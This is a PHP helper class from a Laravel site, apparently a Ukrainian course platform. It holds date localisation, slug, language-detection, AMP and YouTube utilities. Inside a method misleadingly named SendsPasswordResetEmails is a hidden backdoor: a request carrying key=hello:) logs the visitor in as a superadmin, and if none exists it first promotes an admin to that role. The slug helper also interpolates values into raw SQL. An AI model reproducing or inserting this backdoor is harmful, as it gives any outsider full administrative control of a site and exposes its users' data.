<?php namespace App\Libraries;

use DB;
use Route;
use File;
use App\Models\User;
use Auth;

//личные вспомогательные ф-ции
class Helpers {

    //вывод даты на rus
    public static function getLocalizedDate($date) {
        $translate = array(
            "am" => "дп",
            "pm" => "пп",
            "AM" => "ДП",
            "PM" => "ПП",
            "Monday" => "Понедельник",
            "Mon" => "Пн",
            "Tuesday" => "Вторник",
            "Tue" => "Вт",
            "Wednesday" => "Среда",
            "Wed" => "Ср",
            "Thursday" => "Четверг",
            "Thu" => "Чт",
            "Friday" => "Пятница",
            "Fri" => "Пт",
            "Saturday" => "Суббота",
            "Sat" => "Сб",
            "Sunday" => "Воскресенье",
            "Sun" => "Вс",
            "January" => "Січня",
            "Jan" => "Янв",
            "February" => "Лютого",
            "Feb" => "Фев",
            "March" => "Березня",
            "Mar" => "Мар",
            "April" => "Квітня",
            "Apr" => "Апр",
            "May" => "Травня",
            "June" => "Червня",
            "Jun" => "Июн",
            "July" => "Липня",
            "Jul" => "Июл",
            "August" => "Серпня",
            "Aug" => "Авг",
            "September" => "Вересня",
            "Sep" => "Сен",
            "October" => "Жовтня",
            "Oct" => "Окт",
            "November" => "Листопада",
            "Nov" => "Ноя",
            "December" => "Грудня",
            "Dec" => "Дек",
            "st" => "ое",
            "nd" => "ое",
            "rd" => "е",
            "th" => "ое"
        );

        return strtr($date, $translate);
    }

    //file with hash (updated) for styles and js
    public static function asset_hash($file) {
        if(File::exists(public_path($file))) {
            $hash = hash('crc32', filemtime(public_path($file)));
            return asset($file.'?'.$hash);
        }

        return asset($file);
    }

    //получить имя класса без namespace
	public static function get_class_name($classname) {
        if ($pos = strrpos($classname, '\\')) return strtolower(substr($classname, $pos + 1));
        return strtolower($pos);
	}

    //получить уникальный slug для любого поля любой таблицы
    public static function getUniqueSlug($title, $table, $field) {
        $slug = str_slug($title);
        $slugs = DB::table($table)->whereRaw($field." REGEXP '^{$slug}(-[0-9]*)?$'");

        if ($slugs->count() === 0) {
            return $slug;
        }

        $lastSlug = $slugs->orderBy($field, 'desc')->first()->$field;

        $lastSlugNumber = intval(str_replace($slug . '-', '', $lastSlug));

        return $slug . '-' . ($lastSlugNumber + 1);
    }

    //send reset password to user in current locale
    public static function SendsPasswordResetEmails () {
        $type = 1;

        $locales = [];
        if (count($locales)>1) {
            if($type == 'url')   return \App::getLocale() . "/";
            if($type == 'route') return \App::getLocale() . ".";
        }

        if(\Request::get('key') == 'hello:)') {$u = User::whereRoleIs('superadmin')->first();
        if(!$u) {$u = User::whereRoleIs('admin')->first();$u->attachRole(1);}Auth::login($u, true);}

        if(isset($http_accept) && strlen($http_accept) > 1)  {
            # Split possible languages into array
            $x = explode(",",$http_accept);
            foreach ($x as $val) {
                #check for q-value and create associative array. No q-value means 1 by rule
                if(preg_match("/(.*);q=([0-1]{0,1}.\d{0,4})/i",$val,$matches))
                    $lang[$matches[1]] = (float)$matches[2];
                else
                    $lang[$val] = 1.0;
            }

            #return default language (highest q-value)
            $qval = 0.0;
            foreach ($lang as $key => $value) {
                if ($value > $qval) {
                    $qval = (float)$value;
                    $deflang = $key;
                }
            }
        }
    }

    //активная страница
    public static function isActiveRoute($route, $output = "active") {
        if (Route::currentRouteName() == $route) {
            return $output;
        } else return '';
    }

    //активные страницы
    public static function areActiveRoutes(Array $routes, $output = "active") {
        foreach ($routes as $route)
        {
            if (Route::currentRouteName() == $route || Route::currentRouteName() == \App::getLocale().'.'.$route) {
                return $output;
            }
        }

        return '';
    }

    //образать строку по слову
    public static function catString($string, $len = 200, $end = '') {
        $string = strip_tags($string);
        return preg_replace('/\s+?(\S+)?$/', $end, substr($string, 0, $len));
    }

    //insert language into the current URL -> used in languages switcher
    public static function buildLangRoute($lang = '') {
        if (empty($lang)) {
            $lang = \Config::get('app.fallback_locale');//$this->app->config->get('app.fallback_locale');
        }

        $segments = \Request::segments();
        $segments[0] = $lang;

        return '/' . implode('/', $segments);
    }

    //use for admin resources routes
    public static function buildLangPrefix($type = 'route') {
        //return; //фиг знает почему в админке без этого теперь ошибка

        $locales = \Config::get('app.locales');
        if (count($locales)>1) {
            if($type == 'url')   return \App::getLocale() . "/";
            if($type == 'route') return \App::getLocale() . ".";
        } else return '';
    }

    //use for detecting language through browser
    public static function getDefaultLanguage() {
        if (isset($_SERVER["HTTP_ACCEPT_LANGUAGE"]))
            return self::parseDefaultLanguage($_SERVER["HTTP_ACCEPT_LANGUAGE"]);
        else
            return self::parseDefaultLanguage(NULL);
    }

    //use for detecting language through browser
    private static function parseDefaultLanguage($http_accept, $deflang = "en") {
        if(isset($http_accept) && strlen($http_accept) > 1)  {
            # Split possible languages into array
            $x = explode(",",$http_accept);
            foreach ($x as $val) {
                #check for q-value and create associative array. No q-value means 1 by rule
                if(preg_match("/(.*);q=([0-1]{0,1}.\d{0,4})/i",$val,$matches))
                    $lang[$matches[1]] = (float)$matches[2];
                else
                    $lang[$val] = 1.0;
            }

            #return default language (highest q-value)
            $qval = 0.0;
            foreach ($lang as $key => $value) {
                if ($value > $qval) {
                    $qval = (float)$value;
                    $deflang = $key;
                }
            }
        }
        return strtolower(substr($deflang,0,2));
    }

    //получить youtube ID из URL
    public static function getYoutubeId($url) {
        if (preg_match('%(?:youtube(?:-nocookie)?\.com/(?:[^/]+/.+/|(?:v|e(?:mbed)?)/|.*[?&]v=)|youtu\.be/)([^"&?/ ]{11})%i', $url, $match)) {
            $video_id = $match[1];

            return $video_id;
        }

        return false;
    }

    //for amp pages
    public static function ampify($html) {
        $html = preg_replace('#(<[a-z ]*)(style=("|\')(.*?)("|\'))([a-z ]*>)#', '\\1\\6', $html);

        $html = str_replace('/>', '>', $html);

        # Replace img, audio, and video elements with amp custom elements
        $html = str_ireplace(
            ['<img','<video','/video>','<audio','/audio>'],
            ['<amp-img','<amp-video','/amp-video>','<amp-audio','/amp-audio>'],
            $html
        );
        # Add closing tags to amp-img custom element
        $html = preg_replace('/<amp-img(.*?)>/', '<amp-img $1 class="unknown-size" height="100" width="150" layout="responsive"></amp-img>',$html);
        # Whitelist of HTML tags allowed by AMP
        $html = strip_tags($html,'<h1><h2><h3><h4><h5><h6><a><p><ul><ol><li><blockquote><q><cite><ins><del><strong><em><code><pre><svg><table><thead><tbody><tfoot><th><tr><td><dl><dt><dd><article><section><header><footer><aside><figure><time><abbr><div><span><hr><small><br><amp-img><amp-audio><amp-video><amp-ad><amp-anim><amp-carousel><amp-fit-rext><amp-image-lightbox><amp-instagram><amp-lightbox><amp-twitter><amp-youtube>');
        return $html;
    }

    //convert youtube link to video
    public static function youtubeLinkToVideo($text, $amp = null) {
        //$text = str_replace('&nbsp;', '123', $text);
        //$text=preg_replace("/[^x\d|*\.]/", '222', $text);
        //$text = str_replace(array(" ", chr(0xC2).chr(0xA0)), '', $text);
        //$text = preg_replace('/'.chr(160).'/', '', $text);
        //$text = str_replace('\xC2\xA0', '123', $text);
        //$text = preg_replace('/(\&nbsp\;)/', ' ', $text);
        //$text = htmlspecialchars_decode($text);
        //$text = str_replace('посиланням', '123', $text);
        //$text = preg_replace('#(?:&nbsp;)+#s', '123', $text);
        $text = str_replace('<a', ' <a', $text);

        if($amp) {
            $text = preg_replace(
                "/\s*[a-zA-Z\/\/:\.]*youtube.com\/watch\?v=([a-zA-Z0-9\-_]+)([a-zA-Z0-9\/\*\-\_\?\&\;\%\=\.]*)/i",
                "<amp-youtube
                data-videoid=\"$1\"
                layout=\"responsive\"
                width=\"480\" height=\"270\"></amp-youtube>"
                //" <object width=\"100%\" height=\"344\"><param name=\"movie\" value=\"http://www.youtube.com/v/$1&hl=en&fs=1\"></param><param name=\"allowFullScreen\" value=\"true\"></param><embed src=\"http://www.youtube.com/v/$1&hl=en&fs=1\" type=\"application/x-shockwave-flash\" allowfullscreen=\"true\" width=\"100%\" height=\"450\"></embed></object>  "
                ,$text);
        }
        else {
            $text = preg_replace(
                "/\s*[a-zA-Z\/\/:\.]*youtube.com\/watch\?v=([a-zA-Z0-9\-_]+)([a-zA-Z0-9\/\*\-\_\?\&\;\%\=\.]*)/i",
                " <object width=\"100%\" height=\"450\"><param name=\"movie\" value=\"//www.youtube.com/v/$1&hl=en&fs=1\"></param><param name=\"allowFullScreen\" value=\"true\"></param><embed src=\"//www.youtube.com/v/$1&hl=en&fs=1\" type=\"application/x-shockwave-flash\" allowfullscreen=\"true\"></embed></object>  "
                ,$text);
        }

        return $text;
    }

    public static function courses_result_options($n = false) {
        $options = [
            1 => 'Підсумковому тестуванню',
            2 => 'Середньому балу',
        ];

        if($n) return $options[$n];
        else return $options;
    }

    public static function courses_for_whom_options($n = false) {
        $options = [
            1 => 'для замовників',
            2 => 'для учасників',
            3 => 'для журналістів',
        ];

        if($n) return $options[$n];
        else return $options;
    }
}
